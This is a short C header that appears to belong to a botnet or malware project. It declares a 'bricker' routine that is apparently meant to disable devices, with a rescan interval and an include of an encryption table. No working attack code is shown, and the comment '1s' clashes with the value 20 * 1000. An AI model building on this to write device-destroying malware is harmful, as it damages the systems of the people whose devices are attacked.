#pragma once

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/times.h>
#include "../../debug.h"

#include "../../../utils/headers/util.h"
#include "../../../utils/headers/includes.h"
#include "../../../encryption/chacha20_table.h"

#define BRICKER_RESCAN_TIME 20 * 1000 // Rescan every 1s.

void bricker_bricks();
